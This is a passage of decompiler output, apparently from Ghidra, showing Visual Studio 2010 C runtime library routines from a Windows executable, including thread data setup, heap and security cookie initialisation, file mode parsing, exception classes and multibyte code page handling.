  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_00416580;
      p_Var5 = _Ptd;
      pcVar1 = (code *)DecodePointer(DAT_00417afc);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2010 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



void FUN_0040af77(void)

{
  FUN_0040da13(0xd);
  return;
}



void FUN_0040af83(void)

{
  FUN_0040da13(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2010 Release

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  undefined *puVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleW(u_KERNEL32_DLL_00412d64);
  if (hModule == (HMODULE)0x0) {
    __mtterm();
    return 0;
  }
  DAT_00417af4 = GetProcAddress(hModule,s_FlsAlloc_00412da0);
  DAT_00417af8 = GetProcAddress(hModule,s_FlsGetValue_00412d94);
  DAT_00417afc = GetProcAddress(hModule,s_FlsSetValue_00412d88);
  DAT_00417b00 = GetProcAddress(hModule,s_FlsFree_00412d80);
  if ((((DAT_00417af4 == (FARPROC)0x0) || (DAT_00417af8 == (FARPROC)0x0)) ||
      (DAT_00417afc == (FARPROC)0x0)) || (DAT_00417b00 == (FARPROC)0x0)) {
    DAT_00417af8 = TlsGetValue_exref;
    DAT_00417af4 = (FARPROC)&LAB_0040ac9c;
    DAT_00417afc = TlsSetValue_exref;
    DAT_00417b00 = TlsFree_exref;
  }
  DAT_00416584 = TlsAlloc();
  if ((DAT_00416584 != 0xffffffff) && (BVar1 = TlsSetValue(DAT_00416584,DAT_00417af8), BVar1 != 0))
  {
    __init_pointers();
    DAT_00417af4 = (FARPROC)EncodePointer(DAT_00417af4);
    DAT_00417af8 = (FARPROC)EncodePointer(DAT_00417af8);
    DAT_00417afc = (FARPROC)EncodePointer(DAT_00417afc);
    DAT_00417b00 = (FARPROC)EncodePointer(DAT_00417b00);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      puVar5 = &LAB_0040ae5d;
      pcVar3 = (code *)DecodePointer(DAT_00417af4);
      DAT_00416580 = (*pcVar3)(puVar5);
      if ((DAT_00416580 != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_00416580;
        p_Var6 = _Ptd;
        pcVar3 = (code *)DecodePointer(DAT_00417afc);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
    __mtterm();
  }
  return 0;
}



// Library Function - Single Match
//  __heap_init
// 
// Library: Visual Studio 2010 Release

int __cdecl __heap_init(void)

{
  DAT_00417b04 = HeapCreate(0,0x1000,0);
  return (uint)(DAT_00417b04 != (HANDLE)0x0);
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2010 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_00416048 == 0xbb40e64e) || ((DAT_00416048 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_00416048 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_00416048 == 0xbb40e64e) {
      DAT_00416048 = 0xbb40e64f;
    }
    else if ((DAT_00416048 & 0xffff0000) == 0) {
      DAT_00416048 = DAT_00416048 | (DAT_00416048 | 0x4711) << 0x10;
    }
    DAT_0041604c = ~DAT_00416048;
  }
  else {
    DAT_0041604c = ~DAT_00416048;
  }
  return;
}



void __cdecl FUN_0040b1c2(undefined4 param_1)

{
  DAT_00417b08 = param_1;
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2010 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)DecodePointer(DAT_00417b08);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



// Library Function - Single Match
//  __lseek_nolock
// 
// Library: Visual Studio 2010 Release

long __cdecl __lseek_nolock(int _FileHandle,long _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  ulong uVar4;
  
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
    DVar3 = 0xffffffff;
  }
  else {
    DVar3 = SetFilePointer(hFile,_Offset,(PLONG)0x0,_Origin);
    if (DVar3 == 0xffffffff) {
      uVar4 = GetLastError();
    }
    else {
      uVar4 = 0;
    }
    if (uVar4 == 0) {
      pbVar1 = (byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
    }
    else {
      __dosmaperr(uVar4);
      DVar3 = 0xffffffff;
    }
  }
  return DVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseek
// 
// Library: Visual Studio 2010 Release

long __cdecl __lseek(int _FileHandle,long _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  long local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00418e90)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __lseek_nolock(_FileHandle,_Offset,_Origin);
        }
        FUN_0040b33a();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004071df();
  }
  return -1;
}



void FUN_0040b33a(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __openfile
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __openfile(char *_Filename,char *_Mode,int _ShFlag,FILE *_File)

{
  char cVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  uchar uVar5;
  int *piVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  char *pcVar9;
  uchar *puVar10;
  uchar *puVar11;
  int local_c;
  uint local_8;
  
  _OpenFlag = 0;
  bVar3 = false;
  local_c = 0;
  bVar4 = false;
  for (pcVar9 = _Mode; *pcVar9 == ' '; pcVar9 = pcVar9 + 1) {
  }
  cVar1 = *pcVar9;
  if (cVar1 == 'a') {
    _OpenFlag = 0x109;
LAB_0040b3a1:
    local_8 = DAT_00417c88 | 2;
  }
  else {
    if (cVar1 != 'r') {
      if (cVar1 != 'w') {
        piVar6 = __errno();
        *piVar6 = 0x16;
        FUN_004071df();
        return (FILE *)0x0;
      }
      _OpenFlag = 0x301;
      goto LAB_0040b3a1;
    }
    local_8 = DAT_00417c88 | 1;
  }
  bVar2 = true;
  puVar10 = (uchar *)(pcVar9 + 1);
  uVar5 = *puVar10;
  if (uVar5 != '\0') {
    do {
      if (!bVar2) break;
      iVar7 = (int)(char)uVar5;
      if (iVar7 < 0x54) {
        if (iVar7 == 0x53) {
          if (local_c != 0) goto LAB_0040b4cb;
          local_c = 1;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (iVar7 != 0x20) {
          if (iVar7 == 0x2b) {
            if ((_OpenFlag & 2) != 0) goto LAB_0040b4cb;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            local_8 = local_8 & 0xfffffffc | 0x80;
          }
          else if (iVar7 == 0x2c) {
            bVar4 = true;
LAB_0040b4cb:
            bVar2 = false;
          }
          else if (iVar7 == 0x44) {
            if ((_OpenFlag & 0x40) != 0) goto LAB_0040b4cb;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (iVar7 == 0x4e) {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (iVar7 != 0x52) goto LAB_0040b580;
            if (local_c != iVar7 + -0x52) goto LAB_0040b4cb;
            local_c = 1;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (iVar7 == 0x54) {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_0040b4cb;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (iVar7 == 0x62) {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040b4cb;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (iVar7 == 99) {
        if (bVar3) goto LAB_0040b4cb;
        local_8 = local_8 | 0x4000;
        bVar3 = true;
      }
      else if (iVar7 == 0x6e) {
        if (bVar3) goto LAB_0040b4cb;
        local_8 = local_8 & 0xffffbfff;
        bVar3 = true;
      }
      else {
        if (iVar7 != 0x74) goto LAB_0040b580;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040b4cb;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      puVar10 = puVar10 + 1;
      uVar5 = *puVar10;
    } while (uVar5 != '\0');
    if (bVar4) {
      for (; *puVar10 == ' '; puVar10 = puVar10 + 1) {
      }
      iVar7 = __mbsnbcmp(&DAT_00412dac,puVar10,3);
      if (iVar7 != 0) goto LAB_0040b580;
      for (puVar10 = puVar10 + 3; *puVar10 == ' '; puVar10 = puVar10 + 1) {
      }
      if (*puVar10 != '=') goto LAB_0040b580;
      do {
        puVar11 = puVar10;
        puVar10 = puVar11 + 1;
      } while (*puVar10 == ' ');
      iVar7 = __mbsnbicmp(puVar10,(uchar *)s_UTF_8_00412db0,5);
      if (iVar7 == 0) {
        puVar10 = puVar11 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __mbsnbicmp(puVar10,(uchar *)s_UTF_16LE_00412db8,8);
        if (iVar7 == 0) {
          puVar10 = puVar11 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __mbsnbicmp(puVar10,(uchar *)s_UNICODE_00412dc4,7);
          if (iVar7 != 0) goto LAB_0040b580;
          puVar10 = puVar11 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *puVar10 == ' '; puVar10 = puVar10 + 1) {
  }
  if (*puVar10 == '\0') {
    eVar8 = __sopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_00417288 = _DAT_00417288 + 1;
    _File->_flag = local_8;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_0040b580:
  piVar6 = __errno();
  *piVar6 = 0x16;
  FUN_004071df();
  return (FILE *)0x0;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &,int)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  *(undefined ***)this = &PTR_FUN_00412dd0;
  *(char **)(this + 4) = *param_1;
  this[8] = (exception)0x0;
  return;
}



// Library Function - Single Match
//  private: void __thiscall std::exception::_Copy_str(char const *)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::exception::_Copy_str(exception *this,char *param_1)

{
  size_t sVar1;
  char *_Dst;
  
  if (param_1 != (char *)0x0) {
    sVar1 = _strlen(param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,param_1);
      this[8] = (exception)0x1;
    }
  }
  return;
}



// Library Function - Single Match
//  private: void __thiscall std::exception::_Tidy(void)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::exception::_Tidy(exception *this)

{
  if (this[8] != (exception)0x0) {
    _free(*(void **)(this + 4));
  }
  *(undefined4 *)(this + 4) = 0;
  this[8] = (exception)0x0;
  return;
}



// Library Function - Single Match
//  public: class std::exception & __thiscall std::exception::operator=(class std::exception const
// &)
// 
// Library: Visual Studio 2010 Release

exception * __thiscall std::exception::operator=(exception *this,exception *param_1)

{
  if (this != param_1) {
    _Tidy(this);
    if (param_1[8] == (exception)0x0) {
      *(undefined4 *)(this + 4) = *(undefined4 *)(param_1 + 4);
    }
    else {
      _Copy_str(this,*(char **)(param_1 + 4));
    }
  }
  return this;
}



void __fastcall FUN_0040b696(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_00412dd0;
  std::exception::_Tidy((exception *)param_1);
  return;
}



undefined4 * __thiscall FUN_0040b6a1(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_00412dd0;
  std::exception::_Tidy((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_00406c67(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2010 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  *(undefined4 *)(this + 4) = 0;
  *(undefined ***)this = &PTR_FUN_00412dd0;
  this[8] = (exception)0x0;
  operator=(this,param_1);
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined ***)this = &PTR__scalar_deleting_destructor__00412df0;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    FUN_00406c67(this);
  }
  return this;
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2010 Release

PVOID __cdecl __onexit_nolock(PVOID param_1)

{
  PVOID *_Memory;
  PVOID *ppvVar1;
  size_t sVar2;
  size_t sVar3;
  PVOID pvVar4;
  int iVar5;
  
  _Memory = (PVOID *)DecodePointer(DAT_00418fa8);
  ppvVar1 = (PVOID *)DecodePointer(DAT_00418fa4);
  if ((ppvVar1 < _Memory) || (iVar5 = (int)ppvVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return (PVOID)0x0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return (PVOID)0x0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return (PVOID)0x0;
      }
    }
    ppvVar1 = (PVOID *)((int)pvVar4 + (iVar5 >> 2) * 4);
    DAT_00418fa8 = EncodePointer(pvVar4);
  }
  pvVar4 = EncodePointer(param_1);
  *ppvVar1 = pvVar4;
  DAT_00418fa4 = EncodePointer(ppvVar1 + 1);
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2010 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_0040a084();
  p_Var1 = (_onexit_t)__onexit_nolock(_Func);
  FUN_0040b83b();
  return p_Var1;
}



void FUN_0040b83b(void)

{
  FUN_0040a08d();
  return;
}



// Library Function - Single Match
//  _atexit
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_00412df4;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  int __cdecl CPtoLCID(int)
// 
// Library: Visual Studio 2010 Release

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2010 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  _memset((void *)(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_004165a0 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_004165a0 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2010 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
  uint uVar4;
  CHAR CVar5;
  char cVar6;
  BYTE *pBVar7;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [256];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_0040baad:
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_0040baad;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pBVar7 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar7) {
          _memset(local_108 + uVar4,0x20,(*pBVar7 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar7[1];
        pBVar7 = pBVar7 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          CVar5 = local_308[uVar4];
          goto LAB_0040ba50;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        CVar5 = local_208[uVar4];
LAB_0040ba50:
        *(CHAR *)(unaff_ESI + 0x11d + uVar4) = CVar5;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2010 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00416ac0) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)PTR_DAT_004169c8) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_004165a0)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_004169c8;
      lpAddend = (pthreadmbcinfo)PTR_DAT_004169c8;
      InterlockedIncrement((LONG *)PTR_DAT_004169c8);
    }
    FUN_0040bb62();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_0040bb62(void)

{
  FUN_0040da13(0xd);
  return;
}



// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2010 Release

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  int unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_00417b10 = 0;
  if (unaff_ESI == -2) {
    DAT_00417b10 = 1;
    UVar1 = GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_00417b10 = 1;
    UVar1 = GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_00417b10 = 0;
        return unaff_ESI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_ESI;
    }
    UVar1 = *(UINT *)(local_14[0] + 4);
    DAT_00417b10 = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2010 Release

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  BOOL BVar6;
  undefined2 *puVar7;
  byte *pbVar8;
  int extraout_ECX;
  undefined2 *puVar9;
  int iVar10;
  undefined4 extraout_EDX;
  BYTE *pBVar11;
  threadmbcinfostruct *unaff_EDI;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  uVar4 = getSystemCP((int)unaff_EDI);
  if (uVar4 != 0) {
    local_20 = (byte *)0x0;
    uVar5 = 0;
LAB_0040bc25:
    if (*(uint *)((int)&DAT_004169d0 + uVar5) != uVar4) goto code_r0x0040bc31;
    _memset((void *)(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar8 = &DAT_004169e0 + (int)local_20 * 0x30;
    local_20 = pbVar8;
    do {
      for (; (*pbVar8 != 0 && (bVar3 = pbVar8[1], bVar3 != 0)); pbVar8 = pbVar8 + 2) {
        for (uVar5 = (uint)*pbVar8; uVar5 <= bVar3; uVar5 = uVar5 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar5);
          *pbVar2 = *pbVar2 | (&DAT_004169cc)[local_24];
          bVar3 = pbVar8[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar8 = local_20 + 8;
      local_20 = pbVar8;
    } while (local_24 < 4);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar10 = CPtoLCID((int)unaff_EDI);
    *(int *)(param_2 + 0xc) = iVar10;
    puVar7 = (undefined2 *)(param_2 + 0x10);
    puVar9 = (undefined2 *)(&DAT_004169d4 + extraout_ECX);
    iVar10 = 6;
    do {
      *puVar7 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar7 = puVar7 + 1;
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    goto LAB_0040bd59;
  }
LAB_0040bc12:
  setSBCS(unaff_EDI);
LAB_0040bdc1:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x0040bc31:
  local_20 = (byte *)((int)local_20 + 1);
  uVar5 = uVar5 + 0x30;
  if (0xef < uVar5) goto code_r0x0040bc3e;
  goto LAB_0040bc25;
code_r0x0040bc3e:
  if (((uVar4 == 65000) || (uVar4 == 0xfde9)) ||
     (BVar6 = IsValidCodePage(uVar4 & 0xffff), BVar6 == 0)) goto LAB_0040bdc1;
  BVar6 = GetCPInfo(uVar4,&local_1c);
  if (BVar6 != 0) {
    _memset((void *)(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar11 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar11;
          if (bVar3 == 0) break;
          for (uVar4 = (uint)pBVar11[-1]; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
            pbVar8 = (byte *)(param_2 + 0x1d + uVar4);
            *pbVar8 = *pbVar8 | 4;
          }
          pBVar1 = pBVar11 + 1;
          pBVar11 = pBVar11 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar8 = (byte *)(param_2 + 0x1e);
      iVar10 = 0xfe;
      do {
        *pbVar8 = *pbVar8 | 8;
        pbVar8 = pbVar8 + 1;
        iVar10 = iVar10 + -1;
      } while (iVar10 != 0);
      iVar10 = CPtoLCID((int)unaff_EDI);
